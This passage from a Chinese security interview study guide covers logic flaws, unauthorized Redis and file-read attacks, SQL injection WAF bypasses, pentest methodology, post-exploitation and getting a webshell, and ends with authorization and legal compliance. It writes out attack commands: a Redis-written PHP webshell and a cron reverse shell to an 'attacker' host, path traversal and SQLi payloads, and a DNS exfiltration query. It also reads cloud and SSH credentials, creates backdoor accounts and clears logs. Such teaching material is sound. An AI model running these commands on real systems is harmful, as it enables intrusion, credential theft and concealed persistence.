3. 升级库版本（commons-collections 4.0+）
4. 使用 JSON/XML 替代 PHP/Java 原生序列化

**解析**：

考察意图：高级开发+安全双修类问题。回答要点：要区分 PHP/Java 序列化机制差异。易错点：忽视语言间差异（PHP 用魔术方法，Java 用 gadget 链）。面试官想听到：能讲清 POP 链构造思路（从终点危险函数反推调用链），知道 CC1/CC5/CC6 等不同 gadget 的触发点。

**考察知识点**：

- 魔术方法 __wakeup / __destruct
- POP 链构造思路
- ysoserial / marshalsec 工具链
- 白名单 + ObjectInputFilter 防御

---


---

### 第 12 天（精讲） ★★★★ 逻辑漏洞常见类型与防御


**主题**：Web 安全 / 逻辑漏洞

**答案**：

逻辑漏洞是业务流程设计缺陷，自动化扫描难以发现，价值极高：

**1. 越权访问**：

- 水平越权：同级用户 A 可访问用户 B 的数据（修改 ID 参数）
- 垂直越权：普通用户访问管理功能（修改 URL 路径）
- 防御：服务端鉴权 + 对象级 ACL

**2. 支付逻辑**：

- 金额篡改（-1 元 / 0.01 元）
- 数量负数（-1 件商品退款获积分）
- 优惠券 / 积分并发使用
- 货币类型不一致（RMB/USD）
- 防御：服务端校验 + 签名 + 事务一致性

**3. 验证码绕过**：

- 验证码不失效可重复使用
- 验证码回显前端
- 验证码识别（OCR / 打码平台）
- 防御：一次一用 + 后端校验 + 复杂度

**4. 短信 / 邮箱轰炸**：

- 缺少频次限制
- 短信炸弹（每分钟 100 条）
- 防御：频次限制 + 图形验证码 + IP 限制

**5. 密码找回缺陷**：

- 验证码可爆破（4 位数字）
- 找回链接可预测（userid + timestamp）
- 跳过验证步骤直接重置
- 防御：随机 token + 一次性 + 有效期

**6. 条件竞争**：

- 余额扣减并发漏洞
- 抢购超卖
- 防御：事务 + 锁 + 乐观锁

**7. 未授权访问**：

- 后台管理路径无认证
- 内部接口暴露公网
- 防御：身份认证 + ACL

**解析**：

考察意图：考查业务安全思维。回答要点：要列具体类型 + 真实场景。易错点：忽视业务层逻辑而非技术漏洞。面试官想听到：能讲清支付金额篡改的多种手法（前端/后端/签名绕过）、越权是 OWASP Top 10 2021 的第一类（Access Control Failure 前移）。

**考察知识点**：

- 水平 / 垂直越权
- 支付金额篡改 + 签名校验
- 验证码爆破 + 绕过
- 条件竞争并发漏洞

---


---

### 第 13 天（精讲） 未授权访问与任意文件读取/下载
**主题**：Web 安全 / 权限配置

**答案**：

未授权访问指应用/服务缺少身份认证或认证被绕过，导致攻击者直接访问敏感功能或数据。

**典型未授权场景**：

**1. NoSQL/缓存/搜索引擎**（公网暴露最常见）：

| 服务 | 默认端口 | 利用方式 |
|------|---------|---------|
| Redis | 6379 | 写 webshell（`config set dir` + `save`）、SSH 公钥、crontab、DLL/.so 加载 |
| MongoDB | 27017 | 直接 `mongo 1.2.3.4:27017` 连接，dump 数据库 |
| Elasticsearch | 9200 | 读 `/` 看集群信息，`/_cat/indices` 看索引，`_search` 读数据 |
| Memcached | 11211 | `stats` 看统计，`get` 任意 key |
| ZooKeeper | 2181 | `stat`/`get /` 读节点数据 |
| Hadoop HDFS | 50070 | NameNode Web UI，浏览文件系统 |
| Docker Registry | 5000 | `GET /v2/_catalog` 列镜像 |
| Docker API | 2375 | `docker -H tcp://target:2375 ps` 接管容器 |
| Consul | 8500 | `/v1/agent/self` 读服务信息 |
| Kibana | 5601 | 历史 RCE CVE-2018-17246 |
| CouchDB | 5984 | CVE-2017-12635 |
| Spring Boot Actuator | 8080+/actuator | `/env`、`/heapdump`、`/trace` 泄露配置/堆/请求 |

**Redis 未授权 getshell 详解**（最经典）：
```bash
redis-cli -h target

# 1. 写 webshell（web 目录已知）
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php @eval($_POST[1]);?>"
SAVE

# 2. 写 SSH 公钥
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET x "ssh-rsa AAAAB3NzaC1yc2E... attacker@x"
SAVE

# 3. 写 crontab 反弹 shell
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n"
SAVE

# 4. 主从复制 RCE（Redis 4.x/6.x）
# 利用 redis-rogue-server + redis-rce-tools
python redis-rogue-server.py --rhost target --lhost attacker
```

**2. 任意文件读取 / 下载**：

- **路径遍历**：`download?file=../../etc/passwd`
- **常见绕过**：
  - `../../../etc/passwd`
  - `....//....//....//etc/passwd`（双写）
  - `..%2f..%2f..%2fetc/passwd`（URL 编码）
  - `..%252f..%252f..%252fetc/passwd`（双重 URL 编码）
  - `..%c0%af..%c0%afetc/passwd`（UTF-8 绕过）
  - `..%5c..%5c..%5cwindows\system32\config\sam`（Windows 反斜杠）
- **敏感文件清单**：
  - `/etc/passwd`、`/etc/shadow`
  - `C:\Windows\System32\config\SAM`
  - 应用配置：`/WEB-INF/web.xml`、`/WEB-INF/classes/applicationContext.xml`
  - `.git/HEAD`、`.svn/entries`、`.DS_Store`
  - `phpinfo.php`、`server-status`（Apache mod_status）
  - 日志文件：`/var/log/auth.log`、`/var/log/nginx/access.log`

**3. 后台/API 仅靠 URL 隐藏**：

- `/admin/`、`/manage/`、`/backend/`、`/console/`
- 默认账号：admin/admin、admin/password、root/root
- 弱口令爆破（hydra、medusa）

**4. API 端点未鉴权**：

- `/api/v1/users/{id}`（无 token 校验 → IDOR）
- `/api/swagger.json`（Swagger UI 暴露全 API）
- GraphQL endpoint（`/graphql` 内省查询）

**修复策略**：

**网络层**：

- 服务监听内网或 127.0.0.1（Redis、MongoDB、ES 等）
- 云安全组/防火墙限制源 IP
- VPN/堡垒机访问管理后台

**认证层**：

- 所有服务强制认证（Redis `requirepass`、ES `xpack.security.enabled`）
- 应用后台强制鉴权（Spring Security、Shiro、Oauth2）
- API 网关（Kong、APISIX）+ JWT/OAuth2 鉴权

**代码层**：

- 文件路径用 ID 映射（数据库存 ID → 服务端映射真实路径）
- 路径白名单校验（拒绝 `..`、绝对路径、空字节）
- Web 框架封装（如 Spring `Resource` 类）

**关闭不必要的**：

- 删除示例应用（Tomcat examples、phpinfo）
- 关闭目录浏览（`autoindex off`）
- 关闭 Swagger 在生产环境

**解析**：

考察意图：考察企业真实漏洞 + 修复方案。回答要点：分类列典型场景 + 至少 2 种利用方法 + 修复组合。易错点：只说"改密码"。面试官想听到：能讲清 Redis getshell 三种姿势（webshell/SSH/cron）、知道 Elasticsearch 默认无认证、明白服务监听内网 + 强制认证是双保险。

**考察知识点**：

- Redis 未授权 getshell（web/SSH/cron 三种）
- 路径遍历绕过（多重编码/UTF-8/双写）
- Spring Boot Actuator 泄露（/env /heapdump /trace）
- 服务监听配置（内网/127.0.0.1/防火墙）
- ID 映射 + 路径白名单

**验证脚本**（Redis 未授权扫描）：
```python
#!/usr/bin/env python3
# Redis 未授权检测 + 利用 PoC
import socket

def check_redis_unauth(host, port=6379):
    # 检测 Redis 未授权
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, port))
        # 发送 PING 探测
        s.send(b"PING\r\n")
        resp = s.recv(1024)
        if b"PONG" in resp:
            print(f"[+] {host}:{port} Redis 未授权！")
            # 尝试 INFO 命令
            s.send(b"INFO\r\n")
            info = s.recv(4096).decode(errors="ignore")
            return True, info
    except Exception as e:
        print(f"[-] {host}:{port} {e}")
        return False, None
    finally:
        s.close()

if __name__ == "__main__":
    check_redis_unauth("target.com")
```

### 第 14 天（精讲） ★★★ SQL 注入 WAF 绕过与过滤绕过方法


**主题**：数据库安全 / SQL 注入绕过

**答案**：

WAF/应用层过滤是 SQL 注入的主要阻碍，常见绕过维度：

**1. 大小写绕过**：
`unIoN SeLeCt` — 针对大小写过滤

**2. 注释绕过**：
- MySQL：`/*!50000 UNION*/ SELECT`（版本注释可执行）
- `/**/` 替代空格：`UNION/**/SELECT`
- `--+` 加注释
- `;%00` 截断（部分老 IIS）

**3. 等价函数/字符替换**：
- AND → `&&`，OR → `||`，空格 → `%09 %0a %0b %0c %0d +`
- `=` → `LIKE` / `REGEXP` / `IN` / `BETWEEN`
- `SLEEP()` → `BENCHMARK(1000000,SHA1('a'))`
- `SUBSTR` → `MID` / `SUBSTRING` / `LEFT` / `RIGHT`
- `ASCII` → `ORD` / `HEX`
- `USER()` → `CURRENT_USER`

**4. 编码绕过**：
- 双重 URL 编码：`%25%27`
- Unicode 编码：`%u0027`
- 十六进制：`0x27`
- HTML 实体：`&#39;`
- **UTF-8 宽字节**：`%df%27`（GBK 环境吃反斜杠）

**5. HTTP 参数污染（HPP）**：
`?id=1&id=UNION SELECT 1,2,3` — 不同服务器取最后/第一个参数

**6. 分块传输（Chunked Transfer）**：
`Transfer-Encoding: chunked` 绕过 Content-Length 检测

**7. 关键字拆分**：
`UN/**/ION SEL/**/ECT` — 但现代 WAF 会还原

**8. 联合查询列数对齐**：
`order by N` 或 `UNION SELECT 1,2,3,...,N` 直到不报错

**9. 报错注入替代**：
- `extractvalue(1,concat(0x7e,version()))`
- `updatexml(1,concat(0x7e,version()),1)`
- `exp(~(SELECT * FROM (SELECT version())a))` MySQL 5.5.5+

**10. 盲注优化**：
- DNSlog 外带：`SELECT LOAD_FILE(concat('\\\\',version(),'.attacker.com\\a'))`
- 布尔/时间盲注 + 字典二分

**工具**：sqlmap 自带 tamper 脚本 50+，常用：
- `space2comment.py` — 空格替换为 `/**/`
- `between.py` — BETWEEN 替换 =
- `randomcase.py` — 随机大小写
- `charencode.py` — 双重 URL 编码
- `chardoubleencode.py` — 双重 URL
- `unionmagic.py` — UNION 变体

**绕 WAF 前置**：先识别 WAF（识别 WAF 有 WAFW00F、identywaf），再针对性选 tamper。

**解析**：

考察意图：实操能力测试。回答要点：分维度列举绕过方法（注释/编码/函数等价/HPP）。易错点：只背 tamper 不讲原理。面试官想听到：能讲清宽字节原理（GBK 吃掉反斜杠）、chunked 绕过原理、sqlmap tamper 选择策略。

**考察知识点**：

- 宽字节 `%df%27` 绕过
- 等价函数替换
- chunked 分块传输
- sqlmap tamper 选型

---


---

### 第 15 天（精讲） ★★★★★ 渗透测试完整流程


**主题**：渗透测试方法论 / PTES

**答案**：

PTES（Penetration Testing Execution Standard）流程 7 个阶段：

**1. 前期交互（Pre-engagement）**：
- 确定测试范围、目标、规则
- 签署授权协议（NDA/测试合同）
- 紧急联系人沟通
- 明确数据处理规范

**2. 情报搜集（Intelligence Gathering）**：
- 被动信息收集：whois、Google Hacking、GitHub 泄露
- 主动信息收集：Nmap 扫描、目录爆破、指纹识别
- 资产梳理：域名/子域名/IP 段/端口

**3. 威胁建模（Threat Modeling）**：
- 根据收集的信息建立攻击模型
- 优先级排序可能存在的漏洞
- 制定渗透路径

**4. 漏洞分析（Vulnerability Analysis）**：
- 主动扫描：Nessus / AWVS / Burp
- 主动测试：手工挖掘 + PoC 验证
- 漏洞关联分析

**5. 渗透攻击（Exploitation）**：
- 利用漏洞获取初始访问权限
- 漏洞组合利用
- 突破边界

**6. 后渗透攻击（Post Exploitation）**：
- 权限维持、痕迹清除
- 内网横向移动
- 数据提取（按需）
- 报告证据收集

**7. 报告（Reporting）**：
- 执行摘要 + 技术细节
- 漏洞影响评级（CVSS）
- 复现步骤 + 截图证据
- 修复建议

与之对应的 Kill Chain（攻击链模型）：侦察 → 武器化 → 投递 → 利用 → 安装 → 命令控制 → 目标行动。

**解析**：

考察意图：考察专业方法论素养。回答要点：要讲清 7 阶段顺序和目的。易错点：把流程简化成"扫描-攻击-报告"三段。面试官想听到：能讲清 PTES 与 Kill Chain 的区别（PTES 是测试方法论，Kill Chain 是攻击者视角）、威胁建模的作用（决定后续测试优先级）。

**考察知识点**：

- PTES 7 阶段流程
- Kill Chain 攻击链模型
- 威胁建模 Threat Modeling
- 授权 + 范围 + 规则前置确认

---


---

### 第 16 天（精讲） ★★★★★ 外网打点思路与信息收集


**主题**：渗透测试方法论 / 信息收集

**答案**：

外网打点是从互联网边界找到第一个攻击入口的过程。

**第一步 资产梳理**：
- 域名 whois 查询（站长之家 / Whois.chinaz.com）
- 子域名爆破（subfinder / OneForAll / ESD）
- 历史 DNS 记录（ViewDNS / VirusTotal / dnsdb.io）
- 真实 IP 识别（CDN 绕过）

**第二步 CDN 识别与绕过**：
- 多地 PING（ip138 / Cewl / 站长工具）
- 历史 DNS 记录（可能有未走 CDN 的真实 IP）
- 邮件头/订阅邮件泄露真实 IP
- 国外 DNS 请求（部分 CDN 仅国内覆盖）
- Censys / Shodan 搜索
- 查找子域名同 C 段

**第三步 暴露面探测**：
- 端口扫描：Nmap / Masscan（关注 21/22/80/443/445/3389/3306/6379/1433/1521/27017 等）
- 服务识别：`nmap -sV`
- 指纹识别：云悉 / WhatWeb / TideFinger / 观星 / Goby
- 目录扫描：Dirsearch / 御剑 / Burp Spider

**第四步 漏洞利用（重点）**：
- 中间件：Log4j2 / Shiro / Fastjson / Struts2 / ThinkPHP / Spring
- CMS：WordPress / DedeCMS / EmpireCMS / Discuz
- Web 框架：Spring4Shell / Apache Dubbo
- 未授权服务：Redis / MongoDB / Memcached / Elasticsearch / Hadoop

**第五步 社工 + 钓鱼**：
- 水坑攻击：入侵目标常访问网站植入木马
- 鱼叉邮件：定向钓鱼 + 附件投递（CHM / LNK / Office 0day）
- 公开情报：员工邮箱 / Github 泄露

**第六步 重点突破口**：
- 高频打点漏洞：Shiro-550 / Log4j2 / Fastjson 反序列化
- 外围系统往往防护薄弱

**解析**：

考察意图：考察真实渗透经验。回答要点：要展示完整链路而非单一工具。易错点：把外网打点等同于端口扫描。面试官想听到：能讲清楚 CDN 绕过的多种方法（实际渗透中最难的环节）、近年高频爆出的中间件漏洞（Log4j2 / Shiro / Fastjson 几乎是 HW 必出）。

**考察知识点**：

- CDN 识别 + 绕过多方法
- 资产梳理 whois + 子域名 + IP
- 高频中间件漏洞 Log4j2 / Shiro / Fastjson
- 水坑 + 鱼叉社工组合

---


---

### 第 17 天（精讲） 黑盒 / 白盒 / 灰盒测试的区别
**主题**：安全测试方法论 / 测试模型

**答案**：

按**测试者掌握的信息量**划分三种测试模型，对应不同的应用场景与优缺点。

**1. 黑盒测试（Black-box）**：

- **定义**：测试者**无任何内部信息**，仅从外部模拟攻击者。
- **典型场景**：
  - 外部渗透测试（甲方/乙方）
  - SRC 漏洞挖掘（白帽）
  - 真实攻击者视角
- **优点**：最接近真实入侵路径，结论说服力强。
- **缺点**：覆盖率受限于测试者经验与时间，效率低。
- **技术栈**：
  - 资产测绘（fofa/quake/hunter）+ 信息收集
  - 黑盒漏洞扫描（AWVS/Nessus/Burp Scanner）
  - 手工漏洞挖掘（参数 fuzz、业务逻辑）
- **面试话术**：
  > "黑盒测试最接近真实攻击，能验证整体防护链。SRC 提交漏洞时，黑盒 PoC 最有说服力。"

**2. 白盒测试（White-box）**：

- **定义**：测试者**完全掌握内部信息**（源码、架构、网络拓扑、账号）。
- **典型场景**：
  - 代码审计（SAST）
  - 内部上线前安全评估
  - 框架/CMS 内部漏洞挖掘
- **优点**：覆盖深，能发现深层次漏洞（如反序列化链、业务逻辑深层缺陷）。
- **缺点**：脱离真实攻击视角，可能漏掉边界/配置类漏洞。
- **技术栈**：
  - 静态分析工具（Fortify、Checkmarx、Semgrep、CodeQL）
  - 手工代码审计（Top-Down + Bottom-Up + 数据流追踪）
  - 单元测试 + 接口测试（结合 SAST）
- **面试话术**：
  > "白盒测试能挖到黑盒看不到的漏洞，比如一个反序列化漏洞藏在一个极少被调用的工具类中。"

**3. 灰盒测试（Gray-box）**：

- **定义**：测试者掌握**部分内部信息**（如一个普通账号、内部 API 文档、局部架构）。
- **典型场景**：
  - 内部应用测试（员工视角）
  - 已知部分源码/账号的渗透测试
  - Bug Bounty 高级别项目
- **优点**：兼顾效率与真实性，可发现越权/IDOR/接口未鉴权等漏洞。
- **缺点**：仍受限于信息完整度。
- **技术栈**：
  - 黑盒工具 + 部分白盒思路
  - 越权测试（Authz/Authorizator）
  - 业务流程梳理（业务专家配合）
- **面试话术**：
  > "灰盒测试是实战最常见的模式，比如给一个普通员工账号去测业务系统，比纯黑盒效率高很多。"

**对比矩阵**：

| 维度 | 黑盒 | 白盒 | 灰盒 |
|------|------|------|------|
| 信息量 | 无 | 全 | 部分 |
| 真实性 | ★★★★★ | ★★ | ★★★★ |
| 覆盖率 | ★★ | ★★★★★ | ★★★★ |
| 效率 | ★★ | ★★★★ | ★★★★ |
| 漏洞深度 | 中 | 深 | 中深 |
| 适用阶段 | 外部测试 | 上线前 | 内部测试 |
| 工具 | 扫描器+手工 | SAST+审计 | 混合 |
| 报告说服力 | 高 | 中 | 高 |

**实战组合**：
- **甲方安全体系**：白盒（CI/CD 集成 SAST）+ 黑盒（季度渗透测试）+ 灰盒（内部员工模拟测试）。
- **乙方项目**：通常以**灰盒**为主（提供部分账号/文档），出具"外部黑客也能发现"的高质量报告。
- **护网行动**：红队偏**黑盒**（模拟外部入侵），蓝队偏**白盒**（了解内部架构快速定位）。

**面试加分**：
- 实习岗主要黑盒 + 基础白盒。
- 高级岗必须掌握白盒（代码审计能力）。
- 安全专家需要三种混合（白盒挖深 + 黑盒验证）。

**解析**：

考察意图：考察安全测试方法论的认知。回答要点：定义 + 场景 + 优缺点 + 实战组合。易错点：只说"黑盒是外部，白盒是内部"的浅层对比。面试官想听到：能讲清三种模型的**适用阶段 + 工具差异 + 报告说服力**，明白实战中甲方安全体系是三种混合。

**考察知识点**：
- 黑盒/白盒/灰盒的定义与差异
- 适用场景（外部/上线前/内部）
- 工具差异（扫描器 vs SAST vs 混合）
- 实战组合（甲方/乙方/护网）
- 实习 vs 高级岗位的能力侧重

### 第 18 天（精讲） 拿到 webshell 后的思路
**主题**：渗透测试 / 后渗透 / 提权与内网

**答案**：

拿到 webshell 只是开始，**真正价值在于扩大战果**。标准后渗透思路如下。

**1. 判环境**：
```bash
# 系统信息
whoami / uname -a
systeminfo / lsb_release -a
# 权限（是否管理员/root）
whoami /priv
id
# 网络位置（是否内网）
ipconfig / ifconfig / ip addr
arp -a
route print / netstat -rn
# 是否在域
systeminfo | findstr /i "domain"
net config workstation
```

**2. 信息收集**：
```bash
# 配置文件（数据库、云 AK、API 密钥）
cat /var/www/html/config.php /etc/mysql/my.cnf
cat ~/.aws/credentials ~/.ssh/id_rsa

# 进程与服务
tasklist / ps aux
net start / systemctl list-units

# 网络与连接
netstat -ano / ss -tunlp

# 用户与历史
cat /etc/passwd
cat ~/.bash_history

# 计划任务
crontab -l / schtasks /query
```

**3. 提权**（详见 D21/D22/D69）：
- Windows：内核漏洞、令牌盗用（RottenPotato/JuicyPotato）、服务权限配置、AlwaysInstallElevated。
- Linux：脏牛/脏管道、SUID 滥用、sudo 配置错误、cron 任务、环境变量劫持。
- 数据库：UDF 提权（MySQL）、xp_cmdshell（MSSQL）。

**4. 内网横向**（详见 D23）：
```bash
# 主机发现
arp -a / nbtscan / fping / nmap -sn 192.168.1.0/24
# 端口扫描
nmap -sT -p- 192.168.1.0/24
# 凭据复用
crackmapexec smb 192.168.1.0/24 -u user -p password
# 横向工具
psexec / wmic / winrm / ssh / smbclient / rpcclient
```

**5. 权限维持**：
```bash
# Windows
schtasks /create /tn "WindowsUpdate" /tr "C:\shell.exe" /sc onlogon
sc create "WindowsHealth" binPath= "C:\shell.exe"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDrive /t REG_SZ /d "C:\shell.exe"
# SSH 公钥
echo "ssh-rsa ..." >> ~/.ssh/authorized_keys
# 后门账号
net user hacker$ P@ssw0rd /add
net localgroup administrators hacker$ /add
# WebShell 变形 + 隐藏
# Linux
echo "* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1" >> /var/spool/cron/root
```

**6. 数据窃取**：
```bash
# 数据库拖库
mysqldump -uroot -p --all-databases > dump.sql
# 敏感文件
find / -name "*.xlsx" -o -name "*.pdf" 2>/dev/null
# 云 AK 泄露后
aws s3 ls / aws ec2 describe-instances
```

**7. 清理痕迹**：
```bash
# 清日志
echo > /var/log/auth.log
echo > /var/log/nginx/access.log
# Windows
wevtutil cl Security / wevtutil cl System
# 删除上传的 webshell
rm -f /var/www/html/shell.php
# 修改 mtime（防时间戳对比）
touch -r /etc/passwd /var/www/html/shell.php
```

**8. 出报告**：
- 攻击链时间线（从外网突破到域控的完整路径）
- 漏洞清单（CVSS 评分 + 复现步骤 + 修复建议）
- 截图证据（每个关键步骤）
- 影响评估（数据泄露量、业务影响）

**注意事项**：
- **全程在授权范围内**：超出范围立即停止。
- **记录每一步操作**：便于出报告与复测。
- **避免破坏业务**：测试期间暂停生产环境操作。
- **优先核心数据**：不是所有数据都需要获取，找最关键的（如客户数据、域控）。
- **隐蔽 vs 速度**：护网中要隐蔽（流量画像、睡时间长），渗透测试可快。

**实战原则**：
1. **慢而稳**：避免触发告警。
2. **隐蔽 C2**：Malleable C2 Profile + HTTPS + 域前置。
3. **凭证复用**：先查 mimikatz/Seatbelt 等，再做横向。
4. **优先域控**：拿到 KRBTGT 后所有机器都是你的。
5. **避免蜜罐**：探测异常服务响应（如 Cowrie 默认 SSH）。

**解析**：

考察意图：考察实战后渗透能力。回答要点：判环境 → 提权 → 横向 → 权限维持 → 数据 → 清理 → 报告。易错点：只说"提权+内网"不提数据与清理。面试官想听到：能讲清"权限维持 vs 清理"是同等重要的步骤（隐蔽性），明白"出报告"是渗透测试的最终交付物，意识到"凭据复用"比扫端口更重要。

**考察知识点**：
- 后渗透 8 步：判环境→信息→提权→横向→权限维持→数据→清理→报告
- 权限维持手段（计划任务/服务/启动项/SSH 公钥/后门账号）
- 清理痕迹（log + mtime）
- 实战原则（授权/记录/隐蔽/凭证复用）

### 第 19 天（精讲） 获取 webshell 的多种途径
**主题**：渗透测试 / getshell / 漏洞利用链

**答案**：

获取 webshell 的途径可按**稳定性**与**隐蔽性**两个维度评估。

**1. 文件上传**（最直接）：
- 后缀黑名单绕过（phtml/php3/php5/asa/cer/cdx 等）
- 大小写变换 `shell.PhP`
- 双写 `shell.pphphp`（过滤 php 为空）
- 空格点 `shell.php. .`（Windows）
- `::$DATA` 绕过（Windows 备用数据流）
- 00 截断（PHP < 5.3.4、`%00.jpg`）
- 图片马 `GIF89a<?php phpinfo();?>`
- 二次渲染（GIF 调整尺寸后仍含 shell）
- `.htaccess` 写入（Apache）
- `.user.ini` 写入（PHP-FPM）
- 竞争条件上传（先传后删）
- 解析漏洞（详见 D9）

**2. SQL 注入写文件**（详见 D2）：
- 满足 5 条件（路径+FILE权限+secure_file_priv+目录可写+无转义）
- `into outfile / dumpfile`
- 劫持日志（`general_log_file`）

**3. 命令/代码执行**：
- PHP 命令执行：`system/exec/popen/proc_open`
- PHP 代码执行：`eval/assert/call_user_func`
- Java 命令执行：`Runtime.exec / ProcessBuilder`
- Java 表达式注入：`SpEL/OGNL/EL/MVEL`
- Python：`eval/exec/os.system`
- Node.js：`eval/child_process.exec`

**4. 反序列化漏洞**（Java/PHP/Python）：
- Java 反序列化（CommonsCollections/Shiro/FastJson/Jackson/WebLogic/Tomcat）
- PHP 反序列化（POP 链）
- Python pickle（`pickle.loads`）
- Node.js `node-serialize`

**5. 已知 CMS/中间件 RCE**：
| 目标 | 漏洞 | 编号 |
|------|------|------|
| Struts2 | OGNL 注入 | S2-045/046/048/052/053/057/061 |
| Log4j | JNDI 注入 | CVE-2021-44228 |
| Spring | DataBinder | CVE-2022-22965 (Spring4Shell) |
| Tomcat | PUT 上传 | CVE-2017-12615 |
| Tomcat | AJP 读取 | CVE-2020-1938 (GhostCat) |
| WebLogic | XMLDecoder | CVE-2017-10271 |
| JBoss | HttpInvoker | CVE-2015-7501 |
| IIS 6.0 | WebDAV | CVE-2017-7269 |
| Nginx | 空字节 | CVE-2013-4547 |
| Shiro | rememberMe | CVE-2016-4437 (Shiro-550) |
| Fastjson | @type | CVE-2017-18349 |

**6. 第三方组件/插件漏洞**：
- WordPress 插件（WP File Manager / RevSlider）
- Drupal（Drupalgeddon CVE-2014-3704、CVE-2018-7600）
- ThinkPHP（多版本 RCE：`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`）
- Spring 全家桶（Code injection / OGNL）
- Vue/React 一般无洞（前端为主）

**7. 后台模板/配置写入**：
- 登录后台 → 模板编辑（PHP/ASP/JSP 模板插入 webshell）
- 数据库备份（上传 .php 备份文件）
- 插件安装（上传 zip 解压到 web 目录）
- 文件管理器（部分 CMS 提供）

**8. 配置错误**：
- Tomcat 弱口令（admin/admin） → 部署 war
- WebLogic 弱口令 → 部署 war
- phpMyAdmin 无密码 → 执行 SQL 写文件
- Docker API 2375 未授权 → 启动容器挂载 /var/www
- Kibana/ES 无认证 → RCE 或读取

**9. SSRF 攻击链**：
- SSRF → 探测内网 Redis → gopher 协议发命令 → 写 webshell
- SSRF → 探测内网 Tomcat manager → 部署 war

**10. 钓鱼与社工**：
- 邮件钓鱼 → 附件宏 → 上线 C2
- 客服欺诈 → 假工单诱导
- 供应链钓鱼 → 假冒供应商发送恶意更新

**选择策略**（按优先级）：

**1. 稳定性优先（推荐）**：
- 后台模板/配置写入（稳定、可控、不被杀软拦截）
- 已知 CMS 漏洞（成功率 80%+）
- 第三方组件漏洞（覆盖面广）

**2. 隐蔽性优先（护网红队）**：
- 命令执行 + 内存马（无文件）
- 已知中间件漏洞 + C2 通道
- 0day（最隐蔽但贵）

**3. 速度优先（自动化）**：
- sqlmap `--os-shell`
- Burp + 自定义 payload
- MS17-010（永恒之蓝）一键利用

**避免的方式**：
- ❌ 直接传 webshell（杀软秒拦，告警明显）
- ❌ 大马（流量特征明显）
- ❌ 加密 base64 webshell（已纳入特征库）
- ❌ 上传路径与文件名无变化（`shell.php`）

**解析**：

考察意图：考察实战 getshell 思路广度。回答要点：分类列举 5+ 途径 + 选择策略。易错点：只说"上传 webshell"。面试官想听到：能讲清"稳定性 vs 隐蔽性"权衡、知道后台模板写入是优选、明白反序列化漏洞链是现代 web 主流入口。

**考察知识点**：
- 10 类 getshell 途径（上传/SQLi/命令执行/反序列化/中间件/插件/后台/配置/SSRF/钓鱼）
- 经典 CVE 编号（Struts2/Log4j/Spring/Tomcat/WebLogic/Shiro/Fastjson）
- 选择策略（稳定性/隐蔽性/速度三维度）
- 避免方式（无加密大马/默认文件名）

### 第 20 天（精讲） 授权边界与合规
**主题**：安全合规 / 渗透测试授权 / 法律法规

**答案**：

渗透测试是"合法攻击"——所有动作必须严格在书面授权范围内。违反授权边界可能触犯《网络安全法》《数据安全法》《刑法》285/286 条。

**1. 授权流程**：

**前期**：
- 客户/上级书面授权（合同/邮件/工单）。
- 明确范围（IP/域名/系统/部门）、时间窗口、测试方式（黑/白/灰盒）、禁止行为（如禁止 DoS、拖库、生产环境测试）。

**中期**：
- 每日/周报同步测试进度。
- 发现高危立即通报（不分范围）。
- 任何破坏性测试（如拒绝服务）前再次确认。

**收尾**：
- 出具报告（漏洞+复现+危害+修复建议）。
- 修复后回归测试。
- 数据销毁（测试数据、用例、凭据）。

**2. 法律框架**：

**《网络安全法》**（2017-06-01）：
- 第 27 条：禁止任何个人和组织从事侵入他人网络、干扰网络正常功能等危害网络安全的行为。
- 第 28 条：网络运营者应为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。
- 第 76 条：违反本法规定，给他人造成损害的，依法承担民事责任；构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。

**《数据安全法》**（2021-09-01）：
- 第 32 条：任何组织、个人收集数据，应当采取合法、正当的方式，不得窃取或者以其他非法方式获取数据。

**《刑法》**：
- **第 285 条**（**非法侵入计算机信息系统罪**）：
  - 违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。
  - 情节严重的，处三年以上七年以下有期徒刑。
- **第 286 条**（**破坏计算机信息系统罪**）：
  - 违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役。
  - 后果特别严重的，处五年以上有期徒刑。
- **第 253 条之一**（侵犯公民个人信息罪）：窃取或以其他方法非法获取公民个人信息。

**3. 合规操作清单**：

**前**：
- [ ] 取得书面授权（合同、邮件、PO）
- [ ] 明确测试范围（IP、域名、系统、URL、白名单）
- [ ] 明确测试时间窗口（避开业务高峰期）
- [ ] 明确禁止行为（禁止 DoS、拖库、生产环境）
- [ ] 准备应急联系渠道（客户安全负责人/项目对接人）
- [ ] 测试前备份关键数据

**中**：
- [ ] 严格在授权范围内操作
- [ ] 不访问授权范围外的系统（即使发现了）
- [ ] 发现高危/严重漏洞**立即通报**（不分授权范围）
- [ ] 不下载大量数据（拖库）
- [ ] 不在生产环境做压力测试
- [ ] 不修改生产数据
- [ ] 不植入后门（除授权的渗透测试用途）
- [ ] 所有操作记录日志

**后**：
- [ ] 出具报告并交付
- [ ] 修复后回归测试
- [ ] 销毁测试数据、账号、凭据
- [ ] 删除测试用账号、webshell、C2 服务器

**4. 护网合规要点**：

**红队**：
- 不触碰非靶标系统
- 不扩大影响（不要打瘫业务、不要大面积拖库）
- 不触碰红线（医院/铁路/航空等关键基础设施）
- 钓鱼邮件只能在授权邮箱
- 报告及时同步总分

**蓝队**：
- 不主动反制攻击者（除非明确授权）
- 不公开攻击者真实身份（保护隐私）
- 不删除证据（保全现场）

**5. 常见违法场景**（不要做）：

| 场景 | 法律后果 |
|------|---------|
| 未授权扫描（nmap 别人网站） | 《网安法》第 27 条 + 治安处罚 |
| 未授权渗透（拿到内部网站就去测试） | 《刑法》第 285 条 |
| 拖库（下载数据库） | 《刑法》第 285 条 + 侵犯公民个人信息罪 |
| 公开漏洞未授权修复前（披露敏感数据） | 《网安法》第 12/28/44/45 条 |
